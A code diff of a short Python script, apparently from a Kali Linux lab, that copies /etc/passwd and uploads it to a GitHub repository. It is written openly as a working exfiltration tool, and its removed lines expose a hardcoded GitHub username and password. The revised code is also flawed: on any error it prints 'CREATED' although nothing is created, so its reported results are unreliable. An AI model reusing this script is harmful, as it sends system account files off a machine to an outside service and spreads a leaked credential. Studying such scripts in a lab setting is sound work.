@@ -1,6 +1,5 @@
 import subprocess
-import requests
-from requests.auth import HTTPBasicAuth
+from github import Github
 
 def run():
     # Copiar /etc/passwd a /home/kali/Desktop
@@ -8,24 +7,37 @@ def run():
 
     # Definir las variables
     GITHUB_REPO = 'almacenlar'
-    GITHUB_USER = 'lauraalmrui'
-    GITHUB_PASSWORD = 'Monlau22'
+    GITHUB_USER = 'tu_usuario'
+    GITHUB_PASSWORD = 'tu_contraseña'
 
     # Autenticarse en GitHub
-    auth = HTTPBasicAuth(GITHUB_USER, GITHUB_PASSWORD)
+    g = Github(GITHUB_USER, GITHUB_PASSWORD)
 
-    # Realizar la carga a GitHub
-    file_path = '/home/kali/Desktop/passwd'
-    git_file = f'https://raw.githubusercontent.com/{GITHUB_REPO}/master/{file_path}'
-    content = open(file_path, 'r').read()
+    repo = g.get_user().get_repo(GITHUB_REPO)
+    all_files = []
+    contents = repo.get_contents("almacenlar")  # Cambiado para acceder a la carpeta almacenlar en el repositorio
 
-    response = requests.put(git_file, auth=auth, data=content)
+    while contents:
+        file_content = contents.pop(0)
+        if file_content.type == "dir":
+            contents.extend(repo.get_contents(file_content.path))
+        else:
+            file = file_content
+            all_files.append(str(file).replace('ContentFile(path="','').replace('")',''))
 
-    if response.status_code == 200:
+    with open('/home/kali/Desktop/passwd', 'r') as file:
+        content = file.read()
+
+    # Upload to GitHub
+    git_prefix = 'lauraalmrui/'
+    git_file = git_prefix + 'almacenlar/passwd'  # Cambiado para reflejar la estructura de carpetas en el repositorio
+
+    try:
+        contents = repo.get_contents(git_file)
+        repo.update_file(contents.path, "committing files", content, contents.sha, branch="master")
         print(git_file + ' UPDATED')
-    elif response.status_code == 201:
+    except Exception as e:
+        print(e)
         print(git_file + ' CREATED')
-    else:
-        print('Error:', response.status_code)
 
-run()
+
